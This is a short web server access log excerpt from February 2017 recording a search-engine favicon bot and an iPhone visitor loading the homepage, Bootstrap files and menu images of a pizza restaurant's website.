107.21.1.8 - - [27/Feb/2017:11:31:32 -0500] "GET /favicon.ico HTTP/1.1" 404 1363 lagourmetpizza.com "http://lagourmetpizza.com/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" "-"
172.98.79.6 - - [27/Feb/2017:11:34:20 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
172.98.79.6 - - [27/Feb/2017:11:34:20 -0500] "GET /dist/js/bootstrap.js HTTP/1.1" 200 55258 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
172.98.79.6 - - [27/Feb/2017:11:34:20 -0500] "GET /american-pie.JPG HTTP/1.1" 200 454093 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
172.98.79.6 - - [27/Feb/2017:11:34:20 -0500] "GET /dist/css/bootstrap.css HTTP/1.1" 200 124612 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
172.98.79.6 - - [27/Feb/2017:11:34:20 -0500] "GET /contact.css HTTP/1.1" 200 2988 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
172.98.79.6 - - [27/Feb/2017:11:34:20 -0500] "GET /california.JPG HTTP/1.1" 301 252 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
172.98.79.6 - - [27/Feb/2017:11:34:20 -0500] "GET /mediterr.JPG HTTP/1.1" 200 417161 www.lagourmetpizza.com "http://www.lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
